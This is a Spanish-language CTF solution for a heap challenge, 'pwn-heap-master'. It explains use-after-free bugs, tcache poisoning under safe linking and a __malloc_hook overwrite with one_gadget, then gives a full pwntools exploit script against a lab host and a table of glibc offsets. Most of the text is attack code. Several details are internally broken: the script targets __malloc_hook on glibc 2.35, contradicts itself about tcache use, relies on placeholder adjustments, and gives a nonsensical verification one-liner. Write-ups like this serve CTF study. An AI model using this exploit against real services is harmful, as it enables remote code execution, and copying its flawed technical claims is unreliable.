# Solución — pwn-heap-master

## Vulnerabilidades

1. **UAF read** (`do_read` no verifica `in_use`) → leer contenido de chunks liberados
2. **UAF write** (`do_write` no verifica `in_use`) → escribir en chunks liberados
3. **No null-pointer en free** → doble acceso post-free

## Exploit en 4 fases

### Fase 1 — Leak de dirección libc via unsorted bin

Los chunks `NOTE_LARGE` (0x88 bytes → chunk de 0x90) **no** entran en tcache (máx 7 por tamaño). Al liberar 8 chunks de 0x90, el 8vo entra al unsorted bin. Los punteros `fd`/`bk` del unsorted bin apuntan a `main_arena` (dentro de libc).

```python
# Rellenar tcache[0x90] con 7 chunks
for i in range(7):
    alloc_large()   # notas 0-6

# Octavo chunk va al unsorted bin al liberar
alloc_large()       # nota 7
for i in range(7): delete(i)   # llena tcache[0x90]
delete(7)           # → unsorted bin (no cabe en tcache lleno)

# UAF read sobre nota 7: los primeros 8 bytes son fd → main_arena
data = read_note(7)
libc_base = unpack_addr(data[:8]) - MAIN_ARENA_OFFSET
```

### Fase 2 — Leak de dirección heap via tcache next ptr

```python
alloc_small()  # nota 8
delete(8)      # chunk va a tcache[0x40]
# UAF read: los primeros 8 bytes son el next ptr del tcache (XOR mangled en glibc 2.32+)
data = read_note(8)
heap_ptr = unpack_addr(data[:8])
# En glibc 2.32+: tcache next = real_addr ^ (heap_addr >> 12)
heap_base = heap_ptr << 12  # aproximación; ajustar con brute si es necesario
```

### Fase 3 — Tcache poisoning (glibc 2.35)

En glibc 2.32+ el puntero next del tcache está cifrado (safe linking):
`stored = real_next ^ (chunk_addr >> 12)`

```python
# Allocar dos chunks pequeños consecutivos
alloc_small()  # nota 9  (addr: heap_base + A)
alloc_small()  # nota 10 (addr: heap_base + B)

# Liberar en orden: primero nota 10, luego nota 9
# tcache[0x40]: nota9 → nota10 → NULL
delete(10)
delete(9)

# UAF write sobre nota 9 (head del tcache[0x40]):
# Sobreescribir el fd cifrado para apuntar a __malloc_hook
target = libc_base + MALLOC_HOOK_OFFSET
# chunk_addr de nota 9 es conocido por la fase 2
mangled = target ^ (chunk9_addr >> 12)
write_note(9, p64(mangled))
```

### Fase 4 — Overwrite `__malloc_hook` → one_gadget

```python
# Primer alloc devuelve nota9 (limpia la cabeza del tcache)
alloc_small()  # → chunk original nota9

# Segundo alloc devuelve __malloc_hook (address inyectada)
alloc_small()  # → ptr a __malloc_hook

# Escribir one_gadget en __malloc_hook
write_note(nuevo_idx, p64(libc_base + ONE_GADGET))

# Triggerear malloc() → ejecuta one_gadget → shell
alloc_small()
```

### Script completo

```python
from pwn import *

HOST = '172.30.5.31'
PORT = 9999

MAIN_ARENA_OFFSET = 0x1f2cc0   # glibc 2.35 Ubuntu 22.04 amd64
MALLOC_HOOK_OFFSET = 0x1f2b10
ONE_GADGET = 0xe3b01           # requiere: rsp+0x50 == NULL

def alloc_s(p): p.sendline(b'1')
def alloc_l(p): p.sendline(b'2')

def write(p, idx, data):
    p.sendline(b'3')
    p.sendlineafter(b'Note index', str(idx).encode())
    p.sendlineafter(b'Data', data)

def read_n(p, idx):
    p.sendline(b'4')
    p.sendlineafter(b'Note index', str(idx).encode())
    p.recvuntil(f'Note {idx}: '.encode())
    return p.recvline()

def delete(p, idx):
    p.sendline(b'5')
    p.sendlineafter(b'Note index', str(idx).encode())

p = remote(HOST, PORT)

# Fase 1: libc leak
for i in range(7): alloc_l(p)
alloc_l(p)  # nota 7
for i in range(7): delete(p, i)
delete(p, 7)

raw = read_n(p, 7)
libc_base = u64(raw[:8].ljust(8, b'\x00')) - MAIN_ARENA_OFFSET
log.success(f'libc_base = {hex(libc_base)}')

# Fase 2+3: heap leak + tcache poisoning
alloc_s(p)  # nota 8
alloc_s(p)  # nota 9
alloc_s(p)  # nota 10

delete(p, 8)
raw2 = read_n(p, 8)
heap_secret = u64(raw2[:8].ljust(8, b'\x00'))

delete(p, 10)
delete(p, 9)
raw3 = read_n(p, 9)
ptr9 = u64(raw3[:8].ljust(8, b'\x00'))
chunk9_addr_shifted = ptr9 ^ heap_secret
chunk9_addr = chunk9_addr_shifted << 0  # ajustar si es necesario

target = libc_base + MALLOC_HOOK_OFFSET
mangled = target ^ (chunk9_addr >> 12)
write(p, 9, p64(mangled))

# Fase 4: overwrite y shell
alloc_s(p)  # consume nota9
alloc_s(p)  # apunta a __malloc_hook → idx 11
write(p, 11, p64(libc_base + ONE_GADGET))

alloc_s(p)  # triggerear → shell
p.interactive()
```

## Offsets glibc 2.35 (Ubuntu 22.04 amd64)

```
main_arena:    0x1f2cc0
malloc_hook:   0x1f2b10
one_gadget[0]: 0xe3b01  (condición: rsp+0x50 == NULL)
one_gadget[1]: 0xe3b04  (condición: rsp+0x48 == NULL)
```

Verificar con: `python3 -c "import ctypes; l=ctypes.CDLL('libc.so.6'); print(hex(l.__malloc_hook.address - ctypes.addressof(ctypes.c_int.in_dll(l, 'a'))))"` o `one_gadget /lib/x86_64-linux-gnu/libc.so.6`
